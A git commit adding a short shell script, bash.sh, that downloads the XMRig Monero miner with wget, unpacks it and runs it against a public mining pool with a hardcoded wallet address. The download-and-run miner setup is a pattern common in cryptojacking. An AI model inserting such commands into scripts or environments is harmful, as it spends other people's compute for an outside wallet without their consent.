81c7ed16a7dcf072fa0a8e67608bd45dba6cb7ac
Green-bit1 <77486298+Green-bit1@users.noreply.github.com>
2022-04-26 12:53:21 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 85Tmu4TEn8c5quxj6k7mvyBEShsrSPRA1CHc967vgbtQFm8BQmmCfoK4BtgHuLBGB5Hxmc9t1yAGfeHezVvzr5djUmcWqFd -k --tls --rig-id rig
